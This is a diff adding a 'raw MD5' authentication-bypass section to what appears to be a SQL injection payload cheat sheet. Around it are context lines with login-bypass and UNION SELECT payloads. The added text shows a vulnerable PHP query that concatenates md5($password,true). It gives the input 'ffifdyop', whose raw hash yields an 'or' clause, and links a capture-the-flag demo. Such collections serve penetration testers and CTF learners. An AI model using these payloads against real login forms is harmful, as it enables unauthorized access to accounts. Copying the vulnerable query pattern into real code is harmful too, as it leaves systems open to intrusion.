@@ -293,6 +293,22 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
+## Authentication Bypass (Raw MD5)
+
+When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
+
+```php
+"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
+```
+
+Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`
+
+```php
+md5("ffifdyop", true) = 'or'6�]��!r,��b
+```
+
+Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
+
 ## Polyglot injection (multicontext)
 
 ```sql
